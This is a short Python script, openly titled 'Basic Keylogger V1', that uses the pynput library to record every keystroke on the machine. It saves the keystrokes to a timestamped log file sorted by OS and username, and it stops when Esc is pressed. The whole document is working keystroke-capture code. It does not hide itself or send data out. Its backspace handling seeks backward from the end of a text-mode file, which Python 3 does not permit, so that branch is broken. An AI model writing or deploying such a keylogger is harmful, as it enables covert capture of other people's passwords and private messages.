#!/usr/bin/env python3
#
# Basic Keylogger V1
# Coded by Jonathan Houle
# September, 2024

import platform
from pynput import keyboard
from pathlib import Path
import getpass
from datetime import datetime

# Constants for creating the text file
CURRENT_OS_NAME = platform.system()
CURRENT_OS_VERSION = platform.release()
CURRENT_OS_CURRENT_USER = getpass.getuser()
CURRENT_TIME_OBJECT = datetime.now()
CURRENT_TIME_STRING = CURRENT_TIME_OBJECT.strftime("%d-%b-%Y-%H:%M:%S")

REPERTORY_FOR_LOGS = "./logs/" + CURRENT_OS_NAME + "/" + CURRENT_OS_CURRENT_USER + "/"
FILENAME = "keylogger_" + CURRENT_TIME_STRING + ".txt"

# Starting message
print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + REPERTORY_FOR_LOGS + FILENAME)
print("OS: " + CURRENT_OS_NAME)
print("Version: " + CURRENT_OS_VERSION)

# Creating folder for logs if it does not exist and creating the text file
Path(REPERTORY_FOR_LOGS).mkdir(parents=True, exist_ok=True)
file = open(REPERTORY_FOR_LOGS + FILENAME ,"w")

# Print keys input in terminal (Later, in a text file)
def on_pressing_key(key):
    try:
        print("{0}".format(key))
        if(key != keyboard.Key.esc):
            match key: 
                # If Return or Tab is pressed, we want to add a line to the text file
                case keyboard.Key.enter:
                    file.write("\n")
                case keyboard.Key.tab:
                    file.write("\n")
                # If Space is pressed, we want to add a space to the text file
                case keyboard.Key.space:
                    file.write(" ")
                # If Backspace is pressed, we want to delete the last character from the file
                case keyboard.Key.backspace:
                    file.seek(-1, 2) 
                    file.truncate()
                # Anything else is printed normally
                case _:
                    k = str(key).replace("'", "")
                    file.write("{0}".format(k))
                

    except AttributeError:
        print("{0}".format(key))

# To stop the listener
def on_key_release(key):
    if key == keyboard.Key.esc:
        file.close()
        print("Keylogger stopped.")
        return False

# Collecting events until released
with keyboard.Listener(
    on_press=on_pressing_key,
    on_release=on_key_release) as listener:
    listener.join()
